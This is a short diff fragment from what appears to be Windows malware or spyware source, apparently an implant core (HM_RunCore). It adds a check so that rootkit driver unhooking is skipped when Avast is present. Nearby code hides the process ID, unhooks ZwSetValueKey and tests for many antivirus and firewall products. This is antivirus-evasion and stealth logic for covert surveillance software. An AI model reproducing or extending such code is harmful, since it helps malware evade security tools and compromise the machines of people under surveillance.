@@ -1435,7 +1435,8 @@ void __stdcall HM_RunCore(char *cmd_line, DWORD flags, STARTUPINFO *si, PROCESS_
 
 		HideDevice dev_unhook(drv_path);
 		Sleep(350); // XXX Attesa paranoica
-		dev_unhook.unhook_all(FALSE);
+		if (!IsAvast())
+			dev_unhook.unhook_all(FALSE);
 		dev_unhook.unhook_func("ZwSetValueKey", TRUE);
 		dev_unhook.unhook_hidepid(FNC(GetCurrentProcessId)(), TRUE);
 		if ((IsAvira() || IsBlink() || /*IsKaspersky() ||*/ IsKerio() || IsPGuard() || IsComodo2() || IsComodo3() || IsPanda() || IsTrend() || IsEndPoint()) && (!dev_unhook.unhook_isdrv(DRIVER_NAME_W) && !dev_unhook.unhook_isdrv(DRIVER_NAME_OLD_W))) {
